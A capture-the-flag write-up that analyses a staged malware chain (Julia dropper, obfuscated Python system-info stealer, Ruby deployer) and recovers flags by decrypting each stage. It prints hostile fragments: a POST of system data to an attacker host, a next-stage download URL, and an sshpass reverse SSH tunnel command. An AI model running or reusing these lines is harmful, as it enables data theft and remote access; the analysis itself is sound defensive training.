# Categorization

> Points: 3

> URL: https://drive.google.com/file/d/1IcpKHrthOXOsELZltoRECinAFmvOqV6v/view?usp=sharing </br>
One of our clients detected malicious activity and submitted suspected code for analysis. This code, was downloaded as a tool for categorizing documents on the system.</br>You have been tasked with analyzing this file. What information can you uncover from it?

Installed `julia` according to official [documentation](https://julialang.org/downloads/platform/):

```
wget https://julialang-s3.julialang.org/bin/linux/x64/1.10/julia-1.10.2-linux-x86_64.tar.gz
tar zxvf julia-1.10.2-linux-x86_64.tar.gz
```

Executed `categorization.jl` :
```
# julia categorization.jl            
Resolving package versions...
No Changes to `~/.julia/environments/v1.10/Project.toml`
No Changes to `~/.julia/environments/v1.10/Manifest.toml`
Resolving package versions...
No Changes to `~/.julia/environments/v1.10/Project.toml`
No Changes to `~/.julia/environments/v1.10/Manifest.toml`
Bad Luck :)
```

Modified `categorization.jl` and added code after `decipherbytes` to write decrypted text to separate file:

```
...
decipherbytes = String(decrypt("AES256", :CBC, iv, encryption_key, cipherbytes))

open("decrypted.jl", "w") do file
  write(file, decipherbytes)

end
exit()
#include_string(Main, decipherbytes)
```

After running `julia categorization.jl`, file `decrypted.jl` was created where first flag was found:

```
# cat decrypted.jl                  
flag = "SK-CERT{3ncryp73d_jul14}"

response = HTTP.get("https://api.ipify.org/")
dat = String(response.body)
if occursin("198.18.2.2", dat)
        s = UInt8[
            0x97, 0x8c, 0x8d, 0x8e, 0xc9, 0xcb, 0xca, 0x93, 
....

```
> flag: `SK-CERT{3ncryp73d_jul14}`

# Payload

> Points: 3

> It appears that there was encrypted functionality within the file. Now, our objective is to understand what this functionality entails.

Looking at `decrypted.jl` from [previous step](#categorization), we see that some byte manipulation is happening, so we modify file to write `s` to output instead of passing it to `HTTP.get`. After running our modified `decrypted_modified.jl` we have second flag:

```
# julia-1.10.2/bin/julia decrypted_modified.jl
http://int3.sk/b63f414c1f0c7f5bb1df45c34e0c733f/runner#SK-CERT{53c0nd_m4l_f1l3}

```
> flag: `SK-CERT{53c0nd_m4l_f1l3}`

# Information

> Points: 3

> Downloading another file? Let's investigate and discover its purpose.

From [previous step](#payload) we identified that script is downloading `runner` file from http://int3.sk/b63f414c1f0c7f5bb1df45c34e0c733f/runner, so let's get it:

```
# curl http://int3.sk/b63f414c1f0c7f5bb1df45c34e0c733f/runner -o runner
# file runner   
runner: Python script, ASCII text executable, with very long lines (373)
```

After inspection it is nasty looking python script and as it goes with these, we need to find buried function/variable that would lead us to next step. So we start formatting the code, identifying interesting functions/variables and printing their values. We'll modify function `xx()` and print interesting variables:

```
def xx():
    E={
        'hostname':IllIIlIIllIlIlIll(),
        'cpu_info':IIlIllIlllIIIIIlI(),
        'memory_info':IllIlIIllIIlllIll(),
        'disk_info':IlIllIIIIIllIIlll(),
        'shared_folders':IIIllIlllIlIIIllI(),
        'network_info':IllIllIllIIIIIIII()
    };
    A='-8algDUBYg3_3qiLbEM3S-fDtYGgclI9H__L-6RdGBc2wOWr2ncYfQXsma_TMU13Ef8=';
    F=5133;
    B=bytearray();
    C=bytearray()
    for D in range(len(A)):
        B.append((F+D)*31%256)
    G=base64.urlsafe_b64decode(A)
    print(f'G:${G}')
    for(H,I)in zip(G,B):
        C.append(H^I)
    J=bytes(C).decode(_IlIIIlIIIlIlIIllI);
    print(f'J:${J}')
    requests.post(J,data=E)
            
xx()
exit(1)
```

We've printed variables `E`, `G` and `J` and also ended execution of script after calling `xx()` to ensure nothing else interfere. After running the script we get our flag:

```
# python runner_modified.py
do_connect: Connection to localhost failed (Error NT_STATUS_CONNECTION_REFUSED)
G:$b'\xfb\xc6\xa5\x805\x01b\r\xff\xde\xa8\x8blC7K\xe7\xc3\xb5\x81\xa0rR=\x1f\xff\xcb\xfb\xa4]\x18\x176\xc0\xe5\xab\xdaw\x18}\x05\xec\x99\xaf\xd31Mw\x11\xff'
J:$http://attacker/data_loader#SK-CERT{5y51nf0g47h3r}
```
> flag: `SK-CERT{5y51nf0g47h3r}`

# Functionality

> Points: 3

> Gathering information about the system? What other actions does this script perform?

Continuing from [previous task](#information), analyzing the next section of the `runner_modified.py` starting from line with `if os.path.isfile(G):` we can identify following:
 
- script proceeds if there is file `/etc/vsftpd.conf` (defined in variable `G`)
- it then looks for `local_root` within the conf file, must not be commented out, then
- takes the value of `local_root` and traverses through it `for(O,P,K)in os.walk(J):` looking for files ending in `.doc`,`.docx`, or `.txt` (defined in variable `I`)
- if it finds any such file, it decrypts byte array `B` and calls `requests.get`: `H=requests.get(bytes(B).decode('utf-8',errors='replace')[:56],stream=D)`

Our next steps:

- create file `/etc/vsftpd.conf`
- set `local_root` to `/tmp/test`
- create `sample.txt` file under `/tmp/test`
- before the `request.get` line, we add print and exit to read the decoded `B`:
    
    ```
    print(f"decoded B:{bytes(B).decode('utf-8',errors='replace')}")
    exit(1)
    ```
- run the modified script and get our flag:

   ```
   # python runner_modified.py
   decoded B:http://int3.sk/b63f414c1f0c7f5bb1df45c34e0c733f/deployer#SK-CERT{n3x7_574g3_d0wnl04d}
   ```
> flag: `SK-CERT{n3x7_574g3_d0wnl04d}`
# Last Stage

> Points: 12

> It appears we've reached the final stage of the malware. Our next step is to determine its intended purpose.

From [previous task](#functionality) we saw that `runner` python script is downloading and executing `deployer` from `http://int3.sk/b63f414c1f0c7f5bb1df45c34e0c733f/deployer`. Let's download it and look inside:

```
# curl http://int3.sk/b63f414c1f0c7f5bb1df45c34e0c733f/deployer -o deployer
# file deployer            
deployer: ASCII text, with very long lines (419)
# cat deployer
eval [114,101,113,117,105,114,101].map(&:chr).join + " '" + [115,111,99,107,101,116].map(&:chr).join + "'"
eval [114,101,113,117,105,114,101].map(&:chr).join + " '" + [100,105,103,101,115,116].map(&:chr).join + "'"
umygux = "vSv_dezmjFkWwVFN,vSv_enzmjFkWwVFN,sEYMbumygux"
....
```

Again obfuscated file that we inferred is [`ruby`](https://www.ruby-lang.org/en/) language of which we heard of but no clue. For this task we used [ChatGPT (free)](https://chat.openai.com/) to help us analyze the code and understand it's functionality. It was pretty helpful de-obfuscating it and eventually helped us get the flag. Following prompts were used:

- Can you pretty format the following ruby code?
- Can you replace ambiguous function and variable names with something more readable?
- Can you evaluate the first two lines of code?
- What will the value of "shared_key" will be?

After getting the know the code, we modified the `if` statement and also instead of calling `system` command, we used `puts`:

```
...
if true then puts(vSv_dezmjFkWwVFN.call("10160c43584316151849433.....
...
```

After modification, executed the script and got the final flag:

```
# ruby deployer_modified
sshpass -p SK-CERT{n3x7_574g3_d0wnl04d} ssh -R 1337:localhost:21 attacker@rand
```

> flag: `SK-CERT{n3x7_574g3_d0wnl04d}`